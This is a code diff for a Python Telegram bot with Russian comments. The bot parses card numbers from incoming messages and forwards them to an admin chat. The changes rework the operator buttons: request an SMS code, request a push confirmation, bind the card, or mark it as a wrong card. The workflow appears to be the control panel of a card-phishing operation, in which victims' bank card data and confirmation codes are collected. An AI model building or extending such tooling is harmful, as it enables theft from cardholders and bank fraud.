@@ -322,18 +322,23 @@ def extract_card_number(text):
         return None
 
 # Инлайн кнопки для платежей
-def get_payment_buttons(payment_id, user_id="user123", card_number="0000"):
-    # ВСЕГДА 4 КНОПКИ В 2 РЯДА
+def get_payment_buttons(payment_id, user_id="user123", card_number=None):
     buttons = [
         [
             InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_{payment_id}_{user_id}"),
             InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}_{user_id}")
-        ],
-        [
-            InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind_{payment_id}_{user_id}_{card_number}"),
-            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}_{user_id}")
         ]
     ]
+    
+    # Добавляем кнопку "Привязать" если карта не привязана
+    if card_number and not check_card_in_db(card_number):
+        buttons.append([
+            InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind_{payment_id}_{user_id}_{card_number}")
+        ])
+    
+    buttons.append([
+        InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}_{user_id}")
+    ])
     
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
@@ -615,7 +620,7 @@ async def process_payment_data(message: types.Message):
         )
 
         if payment_id:
-            # ПРОВЕРЯЕМ СТАТУС КАРТЫ В БД СРАЗУ ПРИ СОЗДАНИИ СООБЩЕНИЯ
+            # Проверяем статус карты В БД СРАЗУ
             card_number = payment_data.get('card_number', '')
             card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
             
@@ -633,8 +638,6 @@ async def process_payment_data(message: types.Message):
             formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
             formatted_text += "Выберите действие:"
             
-            # УДАЛЯЕМ оригинальное сообщение и отправляем новое с кнопками
-            await message.delete()
             await bot.send_message(
                 chat_id=ADMIN_CHAT_ID,
                 text=formatted_text,
@@ -645,7 +648,6 @@ async def process_payment_data(message: types.Message):
 
     except Exception as e:
         logger.error(f"💥 Ошибка обработки платежа: {e}")
-
 
 # ========== ОСТАЛЬНЫЕ ОБРАБОТЧИКИ БОТА ==========
 @dp.message(Command("start"))
@@ -1013,10 +1015,6 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-
-
-
-
 
 
 
